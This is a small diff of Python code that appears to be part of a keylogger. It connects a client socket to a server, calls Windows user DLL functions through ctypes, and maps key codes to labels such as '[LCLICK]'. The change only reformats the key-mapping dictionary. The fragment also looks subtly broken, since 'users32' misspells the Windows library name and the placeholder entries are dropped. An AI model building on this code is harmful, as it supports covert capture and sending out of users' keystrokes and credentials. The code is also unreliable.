@@ -8,9 +8,12 @@ clientsocket.connect(serverAddress)
 
 user = ctypes.windll.users32
 
+
+
 def getkey(code):
 	asciiTable = {
-		"0": "[NUL]", "1":"[LCLICK]", ...etc.
+		"0": "[NUL]", 
+		"1":"[LCLICK]",
 	}
 	return asciiTable[code]	
 	
